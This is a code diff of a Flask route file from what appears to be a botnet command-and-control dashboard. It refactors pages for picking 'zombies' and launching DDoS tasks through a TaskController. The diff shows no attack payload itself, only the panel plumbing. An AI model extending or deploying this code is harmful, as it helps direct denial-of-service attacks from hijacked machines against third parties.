@@ -3,13 +3,13 @@
 # r3nt0n
 
 
-from flask import Blueprint, current_app, render_template, request
+from flask import Blueprint, current_app, render_template, request, redirect, url_for
 
 attacks_bp = Blueprint('attacks_bp', __name__)
 
 
 from app import logger, zession
-from app.modules import DataFilter, AttackController
+from app.controllers import DataFilter, TaskController
 from app.modules.crud import read_data, delete_data
 from app.forms import CreateDDosAttackForm
 
@@ -17,13 +17,20 @@ from .custom_decorators import login_required
 
 zession.current_section = 'tools'
 data_type = 'tasks'
-
+data_filter = None
 tasks_deleted = []
+
 
 @attacks_bp.before_request
 def before_request_func():
+    #filter data
+    global data_filter
+    data_filter = DataFilter(data_type)
+    if ('filter_btn' in request.form) or ('btn-delete-tasks' in request.form):
+        data_filter.run(request)
+
     global tasks_deleted
-    #tasks_deleted = []
+    tasks_deleted = []
     # delete tasks
     if (request.method == 'POST') and ('btn-delete-tasks' in request.form):
         selected_tasks = request.form.getlist('tasks_checked')
@@ -32,33 +39,54 @@ def before_request_func():
                 tasks_deleted.append(id)
 
 
-
+#@attacks_bp.route('/attacks/<task_type>/', defaults={'task_type': None}, methods=['GET', 'POST'])
 @attacks_bp.route('/attacks/', methods=['GET', 'POST'])
+@attacks_bp.route('/attacks/<task_type>/', methods=['GET', 'POST'])
 @login_required
-def attacks():
-    # filter data
-    data_filter = DataFilter(data_type)
-    if ('filter_btn' in request.form) or ('btn-delete-tasks' in request.form):
-        data_filter.run(request)
+def attacks(task_type=None):
 
-    return render_template("pages/dashboard/tools/attacks.html", zession=zession,
-                           data_type=data_type, data_filter=data_filter, attacks_deleted=tasks_deleted)
+    zession.current_section = 'tools'
+
+    if task_type is not None:
+        create_attack = TaskController(task_type)
+        create_attack.get_zombies_data()
+
+    if task_type == 'dos':
+        create_attack.form = CreateDDosAttackForm()
+
+    # create attack
+    if (request.method == 'POST') and ('create_btn' in request.form):
+        if create_attack.form.validate_on_submit():
+            selected_zombies = request.form.getlist('zombies_checked')
+            if selected_zombies:
+                create_attack.run(request.form.to_dict(), selected_zombies)
+
+    if task_type is not None:
+        return render_template("pages/dashboard/tools/attacks/{}.html".format(task_type), zession=zession,
+                               data_filter=data_filter, attacks_deleted=tasks_deleted,
+                               create_attack=create_attack, task_type=task_type)
+
+    else:
+        return render_template("pages/dashboard/tools/attacks.html", zession=zession,
+                               data_type=data_type, data_filter=data_filter, attacks_deleted=tasks_deleted)
 
 
 @attacks_bp.route('/ddos-attacks/', methods=['GET', 'POST'])
 @login_required
 def ddos_attacks():
-    # filter data
-    data_filter = DataFilter(data_type)
-    if ('filter_btn' in request.form) or ('btn-delete-tasks' in request.form):
-        data_filter.run(request)
 
-    task_type = 'ddos_attacks'
+    task_type = 'dos'
+
     # create attack
-    create_attack = AttackController('dos')
+    create_attack = TaskController('dos')
+    create_attack.get_zombies_data()
     create_attack.form = CreateDDosAttackForm()
+
     if (request.method == 'POST') and ('create_btn' in request.form):
-        create_attack.run(request)
+        if create_attack.form.validate_on_submit():
+            selected_zombies = request.form.getlist('zombies_checked')
+            if selected_zombies:
+                create_attack.run(request.form.to_dict(), selected_zombies)
 
     return render_template("pages/dashboard/tools/ddos-attacks.html", zession=zession,
                            data_filter=data_filter, attacks_deleted=tasks_deleted,
